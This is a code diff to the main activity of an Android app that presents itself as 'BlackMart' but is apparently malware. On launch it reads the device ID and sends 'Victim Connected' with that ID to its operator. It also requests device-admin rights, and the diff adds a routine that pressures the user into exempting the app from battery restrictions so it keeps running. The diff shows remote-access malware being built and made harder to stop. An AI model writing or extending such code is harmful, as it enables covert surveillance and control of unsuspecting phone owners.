@@ -101,6 +101,7 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         prefs = getSharedPreferences("com.velociraptor.raptor", MODE_PRIVATE);
+
         setContentView(R.layout.activity_main);
         webView = findViewById(R.id.webview);
         StrictMode.ThreadPolicy policy=new StrictMode.ThreadPolicy.Builder().permitAll().build();
@@ -109,17 +110,19 @@ public class MainActivity extends AppCompatActivity {
 
         String deviceId = Settings.Secure.getString(getApplicationContext().getContentResolver(),
                 Settings.Secure.ANDROID_ID);
-
+        ignorebt();
 
         if(amifirst()){
             try {
+
+
                 senddisp("Victim Connected : ID  ----->  "  + deviceId);
 
             } catch (IOException e) {
                 e.printStackTrace();
             }
-            autostart();
-            LongToast.makeLongToast(getApplicationContext(),"Enable Auto Start For BlackMart",13000 );
+            //autostart();
+            //LongToast.makeLongToast(getApplicationContext(),"Enable Auto Start For BlackMart",13000 );
         }
         else{
             try {
@@ -202,6 +205,20 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
+   public void ignorebt() {
+
+
+       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+           PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+           if (!powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
+               Intent intent = new Intent();
+               intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+               intent.setData(Uri.parse("package:" + getPackageName()));
+               startActivity(intent);
+           }
+           LongToast.makeLongToast(getApplicationContext(),"Enable No Restriction For BlackMart",13000 );
+       }
+   }
 
     @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
     private void downloadFile(String filename, String url, String userAgent) {
@@ -270,6 +287,7 @@ public class MainActivity extends AppCompatActivity {
 
     }
     private void  deviceadmin(){
+
         try {
             // Initiate DevicePolicyManager.
             DevicePolicyManager policyMgr = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
